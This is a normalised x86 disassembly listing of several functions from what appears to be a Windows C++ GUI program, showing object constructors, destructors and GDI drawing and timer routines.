mov [ ebp + 0x8 ] eax
push 0x5
call [ GetStockObject@IAT ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xffffffff
push 0x0
push 0x0
push 0x0
add edi 0x30
push edi
push 0x2
push 0x0
push 0x0
push esi
call [ ExtTextOutW@IAT ]
push ebx
push esi
call [ SetBkColor@IAT ]
jmp r-xdata
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x10 ]
cmp eax edi
je r-xdata
push eax
call esi
cmp eax edi
je r-xdata
push eax
push esi
call ebx
mov edx [ edi + 0x3c ]
mov ecx [ edi + 0x34 ]
push edx
mov edx [ edi + 0x30 ]
mov [ ebp - 0x14 ] eax
mov eax [ edi + 0x38 ]
push eax
push ecx
push edx
push esi
call [ Rectangle@IAT ]
mov eax [ ebp - 0x18 ]
push eax
push esi
call ebx
mov ecx [ ebp - 0x14 ]
push ecx
push esi
call ebx
mov [ ebp - 0x4 ] 0x1
mov eax [ ebp + 0x8 ]
mov esi [ DeleteObject@IAT ]
xor edi edi
cmp eax edi
je r-xdata
push eax
call esi
cmp eax edi
je r-xdata
mov [ ebp + 0x8 ] edi
mov [ ebp - 0x10 ] edi
sub_437350
push ebp
mov ebp esp
push 0xffffffff
push sub_445cbb
mov eax [ fs : 0x0 ]
push eax
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
call sub_40e3c0
mov [ ebp - 0x4 ] 0x0
mov [ eax + 0x70 ] r--data
mov cl 0x1
mov [ ebp - 0x4 ] cl
mov [ eax ] r--data
mov [ eax + 0x70 ] r--data
mov [ eax + 0x68 ] cl
mov [ ebp - 0x4 ] 0x2
mov [ eax ] r--data
mov [ eax + 0x70 ] r--data
mov [ eax + 0xc ] 0x34
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x4
sub_4373d0
push ebp
mov ebp esp
push 0xffffffff
push sub_4459bb
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
or ecx 0xffffffff
mov [ ebp - 0x4 ] ecx
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
mov eax 0x1
mov [ ebp - 0x4 ] eax
mov [ esi + 0x70 ] r--data
mov [ ebp - 0x4 ] ecx
mov [ esi ] r--data
test [ ebp + 0x8 ] al
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_437460
push ebp
mov ebp esp
push 0xffffffff
push sub_4458b5
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
cmp [ esi + 0x24 ] 0x0
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
cmp [ esi + 0x25 ] 0x0
je r-xdata
cmp [ esi + 0x26 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov edi [ ecx ]
xor edx edx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] 0x1
mov [ ebp + 0x8 ] edx
mov [ ebp - 0x4 ] 0x2
mov eax [ esi + 0x4 ]
mov ebx [ SelectObject@IAT ]
cmp [ eax + 0x94 ] edx
je r-xdata
mov eax [ esi + 0x4 ]
cmp [ eax + 0xa9 ] 0x0
je r-xdata
mov ecx [ eax + 0x90 ]
mov eax [ eax + 0x94 ]
push ecx
push eax
push edx
call [ CreatePen@IAT ]
push eax
push edi
mov [ ebp - 0x10 ] eax
call ebx
mov [ ebp - 0x18 ] eax
mov eax [ eax + 0x70 ]
push eax
call [ CreateSolidBrush@IAT ]
mov [ ebp + 0x8 ] eax
push 0x5
call [ GetStockObject@IAT ]
jmp r-xdata
mov ecx [ ebp - 0x14 ]
push ecx
push edi
call ebx
mov [ ebp - 0x4 ] 0x1
mov eax [ ebp + 0x8 ]
mov edi [ DeleteObject@IAT ]
cmp eax esi
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
push edi
call ebx
push eax
push edi
call ebx
mov ecx [ esi + 0x3c ]
mov edx [ esi + 0x38 ]
push ecx
mov ecx [ esi + 0x30 ]
push edx
mov [ ebp - 0x14 ] eax
mov eax [ esi + 0x34 ]
push eax
push ecx
push edi
call [ Ellipse@IAT ]
mov edx [ esi + 0x4 ]
xor esi esi
cmp [ edx + 0x94 ] esi
je r-xdata
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp - 0x10 ]
cmp eax esi
je r-xdata
push eax
call edi
cmp eax esi
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
push eax
call edi
cmp eax esi
je r-xdata
mov [ ebp + 0x8 ] esi
mov [ ebp - 0x10 ] esi
sub_4375b0
push ebp
mov ebp esp
push 0xffffffff
push sub_44778e
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov eax esi
call sub_40e3c0
mov [ ebp - 0x4 ] 0x0
mov [ esi + 0x70 ] r--data
mov al 0x1
mov [ ebp - 0x4 ] al
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
mov [ esi + 0x68 ] al
mov [ ebp - 0x4 ] 0x2
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
lea edi [ esi + 0x74 ]
mov ecx rw-data
mov [ ebp - 0x10 ] edi
call edx
add eax 0x10
mov [ edi ] eax
mov [ ebp - 0x4 ] 0x4
mov [ esi + 0xc ] 0x35
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_437660
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_437690
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_437690
push ebp
mov ebp esp
push 0xffffffff
push sub_44587e
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
xor ecx ecx
mov [ ebp - 0x4 ] ecx
lea eax [ esi + 0x74 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] cl
mov eax [ eax ]
sub eax 0x10
lea ecx [ eax + 0xc ]
or edx 0xffffffff
[ ecx ] edx
dec edx
test edx edx
jg r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
mov [ ebp - 0x4 ] 0x3
mov [ esi + 0x70 ] r--data
mov [ ebp - 0x4 ] 0xffffffff
mov [ esi ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
mov ecx [ eax ]
mov edx [ ecx ]
push eax
mov eax [ edx + 0x4 ]
call eax
sub_437740
push esi
mov esi ecx
cmp [ esi + 0x25 ] 0x0
jne r-xdata
pop esi
retn 0x4
cmp [ esi + 0x1c ] 0x0
je r-xdata
cmp [ esi + 0x25 ] 0x0
jne r-xdata
mov ecx [ esi + 0x1c ]
mov eax [ ecx ]
mov edx [ eax + 0x54 ]
push esi
call edx
mov eax [ esi + 0x4 ]
push edi
add eax 0x98
lea edi [ esi + 0x74 ]
call sub_401760
pop edi
sub_437780
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi ecx
cmp [ edi + 0x24 ] 0x0
mov [ ebp - 0x1c ] esi
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_443fba
mov esp ebp
pop ebp
retn 0xc
cmp [ edi + 0x25 ] 0x0
je r-xdata
cmp [ edi + 0x26 ] 0x0
je r-xdata
mov eax [ edi + 0x4 ]
push 0x0
push rw-data
push rw-data
push 0x0
push eax
call __RTDynamicCast
add esp 0x14
mov [ ebp - 0x18 ] eax
test eax eax
je r-xdata
mov ecx [ esi + 0x8 ]
mov esi [ ecx ]
mov ecx [ edi + 0x4 ]
push ebx
lea ecx [ ecx + 0xb0 ]
lea ebx [ ebp - 0x24 ]
lea eax [ ebp - 0x20 ]
mov [ ebp - 0x24 ] 0x0
call sub_414260
mov ecx [ ebp - 0x20 ]
mov eax [ edi + 0x4 ]
cmp ecx [ eax + 0xb4 ]
je r-xdata
mov eax [ edi + 0x4 ]
mov eax [ eax + 0xa0 ]
test eax eax
jne r-xdata
mov ebx [ ecx + 0x10 ]
test ebx ebx
je r-xdata
push eax
push esi
call [ SelectObject@IAT ]
mov ecx [ edi + 0x4 ]
mov ebx [ ecx + 0x70 ]
mov [ ebp - 0x24 ] eax
cmp ebx 0xffffffff
jne r-xdata
mov eax [ rw-data ]
mov edx [ ebx ]
mov eax [ ebx + 0x14 ]
mov edx [ edx + 0xc ]
push eax
mov ecx ebx
call edx
mov eax [ ebx + 0xc ]
mov edx [ ebx + 0x10 ]
xor ecx ecx
push ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] eax
lea ecx [ ebp - 0x14 ]
push ecx
lea eax [ edi + 0x30 ]
mov [ ebp - 0x8 ] edx
mov edx [ ebx ]
mov edx [ edx + 0x14 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov ecx ebx
call edx
push 0x2
push esi
call [ SetBkMode@IAT ]
push ebx
push esi
call [ SetBkColor@IAT ]
push 0x1
push esi
call [ SetBkMode@IAT ]
jmp r-xdata
mov eax [ edi + 0x4 ]
mov eax [ eax + 0x8c ]
mov edx [ edi + 0x4 ]
mov eax [ edx + 0x80 ]
jmp r-xdata
cmp [ edi + 0x27 ] 0x0
je r-xdata
cmp [ eax + 0xc4 ] ecx
jne r-xdata
mov [ eax + 0xc0 ] 0x121212
push eax
push esi
call [ SetTextColor@IAT ]
mov ecx [ edi + 0x74 ]
push 0x8a24
lea ebx [ edi + 0x30 ]
push ebx
push 0xffffffff
push ecx
push esi
call [ DrawTextW@IAT ]
xor eax eax
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x2c ] eax
mov eax [ edi + 0x74 ]
mov ecx [ eax - 0xc ]
lea edx [ ebp - 0x30 ]
push edx
push ecx
push eax
push esi
call [ GetTextExtentPoint32W@IAT ]
mov eax [ ebp - 0x18 ]
or ecx 0xffffffff
cmp [ eax + 0xc0 ] ecx
jne r-xdata
mov edx [ eax + 0xc0 ]
push edx
push 0x1
push 0x0
call [ CreatePen@IAT ]
push eax
push esi
mov [ ebp - 0x28 ] eax
call [ SelectObject@IAT ]
mov ecx [ ebp - 0x30 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebx ]
lea ecx [ eax + ecx + 0xa ]
mov eax [ ebx + 0xc ]
sub eax [ ebx + 0x4 ]
push 0x0
cdq
sub eax edx
mov ebx eax
sar ebx 0x1
add ebx [ edi + 0x34 ]
mov edi [ edi + 0x38 ]
push ebx
push ecx
push esi
mov [ ebp - 0x1c ] ecx
call [ MoveToEx@IAT ]
push ebx
push edi
push esi
call [ LineTo@IAT ]
mov edx [ ebp - 0x18 ]
mov eax [ edx + 0xc4 ]
push eax
push 0x1
push 0x0
call [ CreatePen@IAT ]
push eax
push esi
mov [ ebp - 0x18 ] eax
call [ SelectObject@IAT ]
mov ecx [ ebp - 0x1c ]
push 0x0
inc ebx
push ebx
push ecx
push esi
call [ MoveToEx@IAT ]
push ebx
push edi
push esi
call [ LineTo@IAT ]
mov edx [ ebp - 0x20 ]
mov edi [ SelectObject@IAT ]
push edx
push esi
call edi
mov eax [ ebp - 0x24 ]
push eax
push esi
call edi
mov ecx [ ebp - 0x28 ]
mov esi [ DeleteObject@IAT ]
push ecx
call esi
mov edx [ ebp - 0x18 ]
push edx
call esi
pop ebx
mov [ eax + 0xc0 ] 0x303030
sub_4379e0
push ebp
mov ebp esp
push 0xffffffff
push sub_445cbb
mov eax [ fs : 0x0 ]
push eax
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
call sub_40e3c0
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov [ eax + 0x70 ] r--data
mov dl 0x1
mov [ ebp - 0x4 ] dl
mov [ eax ] r--data
mov [ eax + 0x70 ] r--data
mov [ eax + 0x68 ] dl
mov [ ebp - 0x4 ] 0x2
mov [ eax ] r--data
mov [ eax + 0x70 ] r--data
mov [ eax + 0xc ] 0x3c
mov [ eax + 0x74 ] ecx
mov [ eax + 0x78 ] ecx
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x4
sub_437a70
push ebp
mov ebp esp
push 0xffffffff
push sub_4459bb
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
or ecx 0xffffffff
mov [ ebp - 0x4 ] ecx
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
mov eax 0x1
mov [ ebp - 0x4 ] eax
mov [ esi + 0x70 ] r--data
mov [ ebp - 0x4 ] ecx
mov [ esi ] r--data
test [ ebp + 0x8 ] al
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_437b00
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push ebx
push esi
push edi
mov esi ecx
mov ecx [ ebp + 0x8 ]
push eax
push ecx
mov ecx esi
call sub_40e4c0
mov edi [ esi + 0x4 ]
lea ecx [ edi + 0xb0 ]
lea ebx [ ebp + 0xc ]
lea eax [ ebp + 0x8 ]
mov [ ebp + 0xc ] 0x0
call sub_414260
mov eax [ ebp + 0x8 ]
cmp eax [ edi + 0xb4 ]
je r-xdata
xor eax eax
mov eax [ eax + 0x10 ]
jmp r-xdata
push 0x0
push rw-data
push rw-data
push 0x0
push eax
call __RTDynamicCast
add esp 0x14
pop edi
mov [ esi + 0x78 ] eax
pop esi
pop ebx
pop ebp
retn 0x8
sub_437b70
push ebp
mov ebp esp
push esi
mov esi ecx
cmp [ esi + 0x25 ] 0x0
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov eax [ esi + 0x18 ]
test eax eax
je r-xdata
mov ecx [ esi + 0x18 ]
mov eax [ esi ]
mov edx [ eax + 0x14 ]
push ecx
mov ecx esi
call edx
test al al
je r-xdata
xor al al
pop esi
pop ebp
retn 0x4
xor ecx ecx
mov ecx [ eax + 0x60 ]
test ecx ecx
jne r-xdata
cmp [ esi + 0x25 ] 0x0
jne r-xdata
mov [ esi + 0x7c ] ecx
mov eax [ eax + 0x18 ]
test eax eax
jne r-xdata
mov al 0x1
mov [ esi + 0x25 ] al
pop esi
pop ebp
retn 0x4
cmp [ esi + 0x1c ] 0x0
je r-xdata
mov eax [ esi + 0x70 ]
mov edx [ eax + 0x8 ]
lea ecx [ esi + 0x70 ]
call edx
sub_437be0
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x8 ]
push edi
mov edi ecx
cmp [ edi + 0x24 ] 0x0
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_443fba
mov esp ebp
pop ebp
retn 0xc
cmp [ edi + 0x25 ] 0x0
je r-xdata
cmp [ edi + 0x26 ] 0x0
je r-xdata
push esi
mov esi [ edi + 0x78 ]
test esi esi
je r-xdata
pop esi
mov ecx [ esi + 0x14 ]
mov eax [ esi ]
mov edx [ eax + 0xc ]
push ecx
mov ecx esi
call edx
mov ecx [ esi + 0x10 ]
mov edx [ esi ]
mov edx [ edx + 0x14 ]
xor eax eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] eax
mov eax [ esi + 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ edi + 0x4 ]
mov [ ebp - 0x8 ] ecx
movzx ecx [ eax + 0xa9 ]
push ecx
lea eax [ ebp - 0x14 ]
push eax
add edi 0x30
push edi
push ebx
mov ecx esi
call edx
sub_437c70
push esi
mov esi ecx
mov ecx [ esi + 0x78 ]
mov [ esi + 0x29 ] 0x1
test ecx ecx
je r-xdata
pop esi
retn
mov eax [ ecx ]
mov edx [ eax + 0x34 ]
call edx
test al al
je r-xdata
mov eax [ esi + 0x74 ]
test eax eax
je r-xdata
mov ecx [ esi + 0x78 ]
mov edx [ ecx ]
mov eax [ edx + 0x38 ]
push 0x1
call eax
mov ecx [ esi + 0x7c ]
push 0x0
push eax
push 0xc9
push ecx
call [ SetTimer@IAT ]
mov [ esi + 0x74 ] eax
push eax
mov eax [ esi + 0x7c ]
push eax
call [ KillTimer@IAT ]
mov [ esi + 0x74 ] 0x0
sub_437cf0
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
mov eax [ edi - 0x70 ]
mov edx [ eax + 0x78 ]
lea esi [ edi - 0x70 ]
mov ecx esi
call edx
test al al
je r-xdata
pop edi
xor eax eax
pop esi
pop ebp
retn 0x14
cmp [ ebp + 0xc ] 0x113
jne r-xdata
mov eax [ ebp + 0x10 ]
cmp eax [ edi + 0x4 ]
jne r-xdata
mov eax esi
call sub_426dd0
call sub_437d30
sub_437d30
mov ecx [ esi + 0x78 ]
test ecx ecx
je r-xdata
retn
mov eax [ ecx ]
mov edx [ eax + 0x34 ]
call edx
test al al
je r-xdata
mov eax [ esi + 0x74 ]
test eax eax
je r-xdata
mov ecx [ esi + 0x78 ]
mov edx [ ecx ]
mov eax [ edx + 0x38 ]
push edi
push 0x0
call eax
mov ecx [ esi + 0x78 ]
mov edx [ ecx ]
mov edi eax
mov eax [ edx + 0x3c ]
call eax
mov ecx [ esi + 0x7c ]
push 0x0
push edi
push 0xc9
push ecx
call [ SetTimer@IAT ]
mov [ esi + 0x74 ] eax
pop edi
push eax
mov eax [ esi + 0x7c ]
push eax
call [ KillTimer@IAT ]
mov [ esi + 0x74 ] 0x0
sub_437da0
push ebp
mov ebp esp
push 0xffffffff
push sub_445cbb
mov eax [ fs : 0x0 ]
push eax
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
call sub_40e3c0
xor edx edx
mov [ ebp - 0x4 ] edx
mov [ eax + 0x70 ] r--data
mov cl 0x1
mov [ ebp - 0x4 ] cl
mov [ eax ] r--data
mov [ eax + 0x70 ] r--data
mov [ eax + 0x68 ] cl
mov [ ebp - 0x4 ] 0x2
mov [ eax ] r--data
mov [ eax + 0x70 ] r--data
mov [ eax + 0xc ] 0x3d
mov [ eax + 0x80 ] edx
mov [ eax + 0x74 ] dl
mov [ eax + 0x78 ] 0x1f4
mov [ eax + 0x7c ] cl
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x4
sub_437e40
push ebp
mov ebp esp
push 0xffffffff
push sub_4459bb
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
or ecx 0xffffffff
mov [ ebp - 0x4 ] ecx
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
mov eax 0x1
mov [ ebp - 0x4 ] eax
mov [ esi + 0x70 ] r--data
mov [ ebp - 0x4 ] ecx
mov [ esi ] r--data
test [ ebp + 0x8 ] al
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_437ed0
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
mov eax [ edi - 0x70 ]
mov edx [ eax + 0x78 ]
lea ecx [ edi - 0x70 ]
call edx
test al al
je r-xdata
pop edi
xor eax eax
pop esi
pop ebp
retn 0x14
mov eax [ edi - 0x70 ]
mov edx [ eax + 0x74 ]
lea ecx [ edi - 0x70 ]
call edx
test al al
je r-xdata
cmp [ ebp + 0xc ] 0x113
jne r-xdata
mov eax [ ebp + 0x10 ]
cmp eax [ edi + 0x10 ]
jne r-xdata
lea eax [ edi - 0x70 ]
call sub_426dd0
sub_437f20
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x2c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x28 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi ecx
mov edx [ esi ]
mov [ esp + 0x8 ] eax
mov eax [ edx + 0x78 ]
push edi
mov [ esp + 0x10 ] esi
call eax
test al al
je r-xdata
mov ecx [ esp + 0x34 ]
pop edi
pop esi
pop ebx
xor ecx esp
call sub_443fba
mov esp ebp
pop ebp
retn 0xc
mov edx [ esi ]
mov eax [ edx + 0x74 ]
mov ecx esi
call eax
test al al
je r-xdata
mov ecx [ esi + 0x4 ]
push 0x0
push rw-data
push rw-data
push 0x0
push ecx
call __RTDynamicCast
add esp 0x14
test eax eax
je r-xdata
mov ebx [ eax + 0xc0 ]
test ebx ebx
jle r-xdata
mov esi [ esi + 0x4 ]
xor eax eax
call sub_413ad0
mov edi eax
test edi edi
je r-xdata
lea esi [ esp + 0x14 ]
call sub_41f610
mov edx [ rw-data ]
push edx
lea esi [ esp + 0x28 ]
call sub_41f640
mov ecx [ esp + 0x10 ]
mov edx [ ecx + 0x38 ]
mov esi [ esp + 0x1c ]
sub edx [ ecx + 0x30 ]
sub esi [ esp + 0x14 ]
lea eax [ ecx + 0x30 ]
cmp esi edx
jne r-xdata
mov edx [ edi ]
mov edx [ edx + 0x18 ]
jmp r-xdata
mov edx [ eax + 0xc ]
mov esi [ esp + 0x20 ]
sub edx [ eax + 0x4 ]
sub esi [ esp + 0x18 ]
cmp esi edx
je r-xdata
mov ecx [ ecx + 0x4 ]
movzx ecx [ ecx + 0xa9 ]
push ecx
lea ecx [ esp + 0x28 ]
push ecx
push eax
mov eax [ esp + 0x18 ]
push eax
mov ecx edi
call edx
mov eax [ rw-data ]
inc eax
xor edx edx
div ebx
mov [ rw-data ] edx
mov edx [ edi ]
mov edx [ edx + 0x14 ]
sub_438040
push ebp
mov ebp esp
mov al [ ebp + 0x8 ]
mov [ ecx + 0x2a ] al
test al al
je r-xdata
pop ebp
retn 0x4
cmp [ ecx + 0x7c ] 0x0
je r-xdata
mov eax [ ecx ]
mov edx [ eax + 0x7c ]
call edx
sub_438060
push esi
mov esi ecx
mov eax [ esi ]
mov edx [ eax + 0x78 ]
call edx
test al al
je r-xdata
pop esi
retn
mov eax [ esi ]
mov edx [ eax + 0x74 ]
mov ecx esi
call edx
test al al
je r-xdata
cmp [ esi + 0x74 ] 0x0
jne r-xdata
mov ecx [ esi + 0x78 ]
mov eax [ esi + 0x18 ]
push 0x0
push ecx
mov [ esi + 0x74 ] 0x1
mov eax [ eax + 0x60 ]
push 0xc9
push eax
call [ SetTimer@IAT ]
mov [ esi + 0x80 ] eax
sub_4380b0
push esi
mov esi ecx
mov eax [ esi ]
mov edx [ eax + 0x78 ]
call edx
test al al
je r-xdata
pop esi
retn
mov eax [ esi ]
mov edx [ eax + 0x74 ]
mov ecx esi
call edx
test al al
je r-xdata
cmp [ esi + 0x74 ] 0x0
je r-xdata
mov eax [ esi + 0x80 ]
mov ecx [ esi + 0x18 ]
mov [ esi + 0x74 ] 0x0
mov edx [ ecx + 0x60 ]
push eax
push edx
call [ KillTimer@IAT ]
sub_4380f0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
test eax eax
je r-xdata
pop esi
pop ebp
retn 0x4
cmp [ esi + 0x74 ] 0x0
mov [ esi + 0x78 ] eax
je r-xdata
mov eax [ esi + 0x80 ]
mov ecx [ esi + 0x18 ]
mov edx [ ecx + 0x60 ]
push eax
push edx
call [ KillTimer@IAT ]
mov ecx [ esi + 0x78 ]
mov eax [ esi + 0x18 ]
mov eax [ eax + 0x60 ]
push 0x0
push ecx
push 0xc9
push eax
call [ SetTimer@IAT ]
mov [ esi + 0x80 ] eax
sub_438150
push ebp
mov ebp esp
push 0xffffffff
push sub_44a196
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
push esi
call sub_42c0c0
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
mov [ esi + 0x154 ] r--data
mov [ esi + 0x1a4 ] r--data
mov [ esi + 0x1ac ] r--data
mov [ esi + 0x1d4 ] r--data
mov [ esi + 0x248 ] eax
mov [ esi + 0x24c ] eax
mov [ esi + 0x250 ] eax
mov [ ebp - 0x4 ] 0x1
mov [ esi + 0xc ] 0x48
mov [ esi + 0x220 ] r--data
mov [ esi + 0x258 ] eax
mov [ esi + 0x260 ] eax
mov [ esi + 0x264 ] eax
mov [ esi + 0x25c ] eax
mov [ esi + 0x268 ] eax
mov [ esi + 0x26c ] eax
mov [ esi + 0x270 ] eax
mov [ esi + 0x274 ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_438230
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_438260
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_438260
push ebp
mov ebp esp
push 0xffffffff
push sub_44a15e
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
mov [ esi + 0x154 ] r--data
mov [ esi + 0x1a4 ] r--data
mov [ esi + 0x1ac ] r--data
mov [ esi + 0x1d4 ] r--data
xor edi edi
mov [ ebp - 0x4 ] edi
mov eax [ esi + 0x248 ]
cmp eax edi
je r-xdata
or eax 0xffffffff
mov [ esi + 0x248 ] edi
mov [ esi + 0x24c ] edi
mov [ esi + 0x250 ] edi
mov [ ebp - 0x4 ] eax
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
mov [ esi + 0x154 ] r--data
mov [ esi + 0x1a4 ] r--data
mov [ esi + 0x1ac ] r--data
mov [ esi + 0x1d4 ] r--data
mov [ ebp - 0x4 ] eax
mov ecx esi
call sub_418cc0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
push eax
call [ operator delete@IAT ]
add esp 0x4
sub_438340
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
cmp [ esi + 0x25 ] 0x0
push edi
mov [ esi + 0x24 ] 0x1
jne r-xdata
mov edi [ esi + 0x4 ]
push ebx
lea ecx [ edi + 0xb0 ]
lea ebx [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
mov [ ebp + 0x8 ] 0x0
call sub_414260
mov eax [ ebp - 0x4 ]
cmp eax [ edi + 0xb4 ]
je r-xdata
mov ecx [ ebp + 0x8 ]
mov [ esi + 0x18 ] ecx
test ecx ecx
je r-xdata
mov edi [ esi + 0x4 ]
lea ecx [ edi + 0xb0 ]
lea ebx [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
mov [ ebp + 0x8 ] 0x1
call sub_414260
mov eax [ ebp - 0x4 ]
pop ebx
cmp eax [ edi + 0xb4 ]
je r-xdata
mov edi [ eax + 0x10 ]
test edi edi
je r-xdata
mov eax [ ecx ]
mov edx [ eax + 0x58 ]
call edx
mov [ esi + 0x1c ] eax
test eax eax
je r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
mov edi [ eax + 0x10 ]
test edi edi
je r-xdata
mov edx [ edi ]
mov eax [ edi + 0x14 ]
mov edx [ edx + 0xc ]
push eax
mov ecx edi
call edx
mov eax [ edi + 0x10 ]
mov [ esi + 0x268 ] eax
mov edx [ eax ]
mov ecx eax
